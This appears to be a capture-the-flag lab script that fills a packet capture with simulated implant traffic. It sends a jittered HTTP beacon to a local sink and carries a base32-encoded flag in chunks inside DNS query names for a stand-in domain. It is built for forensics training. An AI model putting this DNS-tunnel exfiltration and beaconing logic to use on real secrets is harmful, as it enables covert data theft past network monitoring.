#!/usr/bin/env python3
"""Low and Slow: benign traffic lab (runs on the throwaway VM only).

Produces the FORENSIC footprint of a beaconing implant with DNS-tunnel exfil, plus
benign background noise, so tcpdump captures a real pcap. No real C2, no real malware:
the "C2" is a local HTTP sink, the exfil is base32(FLAG) carried in DNS query names sent
to the local resolver (they don't resolve; the point is the queries are on the wire).
"""
import os, sys, time, socket, struct, random, threading, http.server, socketserver, urllib.request, base64

FLAG = os.environ.get("FLAG", "H7CTF{low_and_slow_local_test}")
DURATION = int(sys.argv[1]) if len(sys.argv) > 1 else 150
RESOLVER = ("127.0.0.53", 53)          # systemd-resolved; queries captured on lo
C2_PORT = 8443                          # the implant's beacon target (local sink)
WEB_PORT = 8080                         # a benign internal web service (noise target)
EXFIL_DOMAIN = "sync.cdn-telemetry-lab.net"
NOISE_DOMAINS = ["updates.ubuntu.com", "pool.ntp.org", "api.weather.example",
                 "cdn.jsdelivr.net", "grafana.internal.lab", "mirror.lab.local"]


def dns_query(name):
    # minimal DNS A query -> UDP to the resolver (real DNS packet on the wire)
    tid = random.randint(0, 65535)
    q = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    for label in name.split("."):
        q += bytes([len(label)]) + label.encode()
    q += b"\x00" + struct.pack(">HH", 1, 1)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.sendto(q, RESOLVER)
        try:
            s.recvfrom(512)
        except Exception:
            pass
        s.close()
    except Exception:
        pass


def sink(port):
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"ok")
        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0) or 0); self.rfile.read(n)
            self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"ok")
        def log_message(self, *a): pass
    class TS(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True; allow_reuse_address = True
    TS(("127.0.0.1", port), H).serve_forever()


def beacon(stop):
    # regular ~8s beacon to the C2 sink (the interval-regularity tell)
    while not stop.is_set():
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{C2_PORT}/api/v2/checkin", timeout=1).read()
        except Exception:
            pass
        stop.wait(8 + random.uniform(-1.2, 1.2))


def exfil(stop):
    # base32(FLAG) chunked across DNS query names, one chunk every few seconds
    b32 = base64.b32encode(FLAG.encode()).decode().rstrip("=").lower()
    chunks = [b32[i:i + 16] for i in range(0, len(b32), 16)]
    time.sleep(6)
    for i, c in enumerate(chunks):
        if stop.is_set():
            break
        dns_query(f"{i:02d}{c}.{EXFIL_DOMAIN}")
        stop.wait(7 + random.uniform(-1, 1))
    # re-send the set once more for reliability of capture
    time.sleep(4)
    for i, c in enumerate(chunks):
        if stop.is_set():
            break
        dns_query(f"{i:02d}{c}.{EXFIL_DOMAIN}")
        stop.wait(5)


def noise(stop):
    while not stop.is_set():
        r = random.random()
        if r < 0.5:
            dns_query(random.choice(NOISE_DOMAINS))
        else:
            try:
                urllib.request.urlopen(f"http://127.0.0.1:{WEB_PORT}/{random.choice(['','index','assets/app.js','api/health'])}", timeout=1).read()
            except Exception:
                pass
        stop.wait(random.uniform(0.4, 3.0))


def main():
    threading.Thread(target=sink, args=(C2_PORT,), daemon=True).start()
    threading.Thread(target=sink, args=(WEB_PORT,), daemon=True).start()
    time.sleep(1)
    stop = threading.Event()
    for fn in (beacon, exfil, noise, noise):
        threading.Thread(target=fn, args=(stop,), daemon=True).start()
    print(f"[lab] running scenario for {DURATION}s (FLAG in DNS exfil to {EXFIL_DOMAIN})", flush=True)
    time.sleep(DURATION)
    stop.set()
    time.sleep(1)


if __name__ == "__main__":
    main()
